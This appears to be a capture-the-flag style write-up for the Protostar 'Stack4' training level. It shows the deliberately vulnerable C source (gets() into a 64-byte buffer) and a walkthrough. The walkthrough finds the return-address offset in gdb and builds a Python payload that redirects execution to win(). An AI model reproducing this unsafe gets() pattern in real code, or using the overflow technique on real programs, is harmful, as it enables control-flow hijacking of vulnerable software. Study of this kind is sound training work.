# Stack4
## Briefing
Stack4 takes a look at overwriting saved EIP and standard buffer overflows.

This level is at /opt/protostar/bin/stack4

Hints:

1. A variety of introductory papers into buffer overflows may help.
2. gdb lets you do “run < input”.
3. EIP is not directly after the end of buffer, compiler padding can also increase the size.
## Source Code
```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```
## Solution
This challenge is pretty much the same as stack3, but we are overwriting the real return address instead of a variable.
So first as usual we need to find out the offset until we are overwriting the return address.
```
exploit = ''
exploit += 'A' * 64 # 64 Bytes in buffer
exploit += 'BBBBCCCCDDDDEEEEFFFFGGGG'

print(exploit)
```
Running this in the usual way, `python file.py > input`
`gdb /opt/protostar/bin/stack4`
`run < input`

```
Program recieved signal SIGSEGV, Segmentation fault. 
0x45454545 in ?? ()
```
We can see that there is a fault at the memory address 0x45454545.
0x45 is the hex ascii code for 'E' so we can see that the 4 'E' letters are controling the return address.
So there were 12 letters before 'EEEE' so that means that we need 76 letters of padding before we overwrite the return.
64 + 12 = 76
So lets modify the script:
```
exploit = ''
exploit += 'A' * 76
exploit += 'BBBB'

print(exploit)
```
If we have done our maths correctly the program should fault at 0x42424242, hex code for 'B'.
```
Program recieved signal SIGSEGV, Segmentation fault. 
0x42424242 in ?? ()
```
Ok we have full control of the return address, now we need to find the address of the function.
`p win`
```
$1 = {void (void)} 0x80483f4 <win>
```
So win is at 0x80483f4, great now we just need to add that to our script instead of 'BBBB' as our return address.
```
import struct
rp = struct.pack('<L', 0x80483f4)

exploit = ''
exploit += 'A' * 76
exploit += rp

print(exploit)
```
Now lets run this on the actual program because we should have a working exploit.
`/opt/protostar/bin/stack4 < input`
```
code flow successfully changed
```
